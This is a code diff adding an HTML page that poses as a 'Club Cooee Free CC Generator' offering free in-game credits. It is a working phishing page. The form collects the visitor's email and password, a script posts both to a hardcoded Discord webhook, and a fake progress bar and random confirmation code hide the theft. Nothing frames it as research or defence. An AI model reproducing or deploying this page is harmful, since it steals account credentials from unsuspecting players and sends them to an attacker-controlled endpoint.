@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Club Cooee - Add CC</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles */
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(145deg, #1e1e2f, #292945);
+      color: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+
+    header {
+      padding: 2rem;
+      background: linear-gradient(135deg, #3a3a3a, #1f1f1f);
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    header h1 {
+      font-size: 2.8rem;
+      font-weight: 600;
+      color: #00ffcc;
+      letter-spacing: 1px;
+    }
+
+    main {
+      background: #1e1e2f;
+      padding: 2rem;
+      border-radius: 15px;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.6);
+      text-align: center;
+      position: relative;
+      z-index: 2;
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      color: #00ffcc;
+      margin-bottom: 1rem;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 1rem;
+      margin: 1rem 0;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      border: none;
+    }
+
+    input {
+      background: #292945;
+      color: white;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    input:focus {
+      outline: none;
+      box-shadow: inset 0 2px 4px rgba(0, 255, 204, 0.5);
+    }
+
+    button {
+      background-color: #00ffcc;
+      color: #121212;
+      font-weight: bold;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #00e6b8;
+      transform: scale(1.05);
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    /* Progress Bar */
+    .progress-container {
+      display: none;
+      margin-top: 1rem;
+      z-index: 10; /* Z-index faible pour qu'il ne couvre pas le popup */
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 12px;
+      background: #444;
+      border-radius: 5px;
+      position: relative;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0;
+      background: #00ffcc;
+      border-radius: 5px;
+      transition: width 3s ease-in-out;
+    }
+
+    /* Popup */
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #292945;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.7);
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+      z-index: 1000; /* Z-index élevé pour qu'il apparaisse devant tous les autres éléments */
+    }
+
+    .popup p {
+      font-size: 1.4rem;
+      color: #00ffcc;
+      margin-bottom: 1.5rem;
+    }
+
+    .popup button {
+      padding: 0.6rem 1.2rem;
+      background-color: #00ffcc;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+    }
+
+    .popup button:hover {
+      background-color: #00e6b8;
+      transform: scale(1.05);
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <h1>Club Cooee - Free CC Generator</h1>
+  </header>
+
+  <!-- Main Section -->
+  <main>
+    <h2>Enter Your Details</h2>
+    <form id="cc-form">
+      <input type="email" id="email" placeholder="Enter your email" required>
+      <input type="password" id="password" placeholder="Enter your password" required>
+      <button type="submit">Generate CC</button>
+    </form>
+
+    <!-- Progress Bar -->
+    <div class="progress-container" id="progress-container">
+      <p>Processing request...</p>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Popup Message -->
+  <div class="popup" id="popup">
+    <p>CC Successfully Added! Confirmation Code: <span id="code">XXXXXX</span></p>
+    <p><strong>Note:</strong> Please allow 24-48 hours for the CC to be added to your account.</p>
+    <button onclick="closePopup()">OK</button>
+  </div>
+
+  <script>
+    // Function to close the popup
+    function closePopup() {
+      document.getElementById("popup").style.display = "none";
+    }
+
+    // Webhook function to submit the form data
+    function sendWebhookData(email, password) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1342214766655049821/eHUo5txK0OM0BTemW9xhqkePzaJFSWKcwlhF62fK03Sa3jn_TY4fgnmZ_U6BVwN7PHT0'; // Replace with your actual webhook URL
+  const data = {
+    content: `@here\nEmail: ${email}\nPassword: ${password}`, // Added @here to mention everyone in the channel
+    embeds: [
+      {
+        title: "New CC Details",
+        description: `Email: ${email}\nPassword: ${password}`,
+        color: 3447003,
+        image: {
+          url: "https://example.com/your-image.png" // Replace with the actual image URL
+        }
+      }
+    ]
+  };
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+}
+
+    // Form submit handler
+    document.getElementById("cc-form").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      // Get email and password
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Show the progress bar and start the animation
+      document.getElementById("progress-container").style.display = "block";
+      document.getElementById("progress-fill").style.width = "100%";
+
+      // Send data to webhook
+      sendWebhookData(email, password);
+
+      setTimeout(() => {
+        // Hide the progress bar and show the popup
+        document.getElementById("progress-container").style.display = "none";
+        document.getElementById("popup").style.display = "block";
+        
+        // Display a random confirmation code
+        document.getElementById("code").innerText = Math.floor(100000 + Math.random() * 900000);
+      }, 3000); // Wait for 3 seconds before showing the popup
+    });
+  </script>
+</body>
+</html>
